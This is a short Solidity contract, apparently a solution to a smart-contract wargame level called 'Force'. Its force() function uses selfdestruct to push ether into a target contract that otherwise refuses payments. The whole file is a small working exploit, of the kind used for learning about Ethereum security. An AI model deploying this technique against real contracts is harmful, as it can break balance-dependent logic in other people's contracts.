// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './force.sol';

contract AttackForce {

    Force vuln_contract;

    constructor(address  _vuln_contract) {
        vuln_contract = Force(payable(_vuln_contract));
    }

    function force() public payable{
        require(msg.value > 0);
        address payable target = payable(address(vuln_contract));
        selfdestruct(target);
    }

}
